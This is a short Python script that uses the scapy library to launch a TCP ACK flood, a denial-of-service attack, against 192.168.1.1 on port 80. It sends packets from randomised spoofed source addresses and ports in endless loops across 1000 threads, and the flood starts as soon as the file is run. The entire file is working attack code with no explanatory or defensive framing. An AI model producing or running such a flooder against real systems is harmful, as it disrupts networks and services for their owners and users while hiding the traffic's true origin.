from scapy.all import IP, TCP, RandIP, RandShort, send
import threading

target_ip = "192.168.1.1"
target_port = 80

def ack_flood_worker(target_ip, target_port):
    while True:
        src_ip = RandIP()
        src_port = RandShort()
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="A")
        packet = ip/tcp

        send(packet, verbose=False)

def ack_flood(target_ip, target_port, num_threads=10):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=ack_flood_worker, args=(target_ip, target_port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

ack_flood(target_ip, target_port, num_threads=1000)
